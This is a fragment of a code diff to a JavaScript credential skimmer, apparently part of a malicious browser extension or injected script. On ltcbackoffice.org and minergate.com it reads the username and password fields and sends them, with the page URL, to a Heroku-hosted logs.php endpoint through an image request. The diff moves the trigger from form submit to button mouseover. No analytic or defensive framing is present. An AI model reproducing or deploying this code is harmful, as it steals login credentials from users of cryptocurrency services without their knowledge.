@@ -78,18 +78,18 @@ for (var i = 0; i < arrayLength; i++) {
       };
     };
 
-      if (top['location']['href']['indexOf']('ltcbackoffice.org') > -1) {
-      document.getElementById("login-form").onsubmit = function() {
-        username = document.getElementById("username").value;
-        user_pass = document.getElementById("password").value;
-        if (username && user_pass) {
-          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
-        }
-      };
-    };
+    if (top['location']['href']['indexOf']('ltcbackoffice.org') > -1) {
+    document.getElementsByTagName("button")[0].onmouseover = function() {
+      username = document.getElementById("username").value;
+      user_pass = document.getElementById("password").value;
+      if (username && user_pass) {
+        (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
+      }
+    }
+  };
 
     if (top['location']['href']['indexOf']('minergate.com') > -1) {
-      document.getElementsByName("mainForm")[0].onsubmit = function() {
+      document.getElementsByTagName("button")[0].onmouseover = function() {
         username = document.getElementsByName("email")[0].value;
         user_pass = document.getElementsByName("password")[0].value;
         if (username && user_pass) {
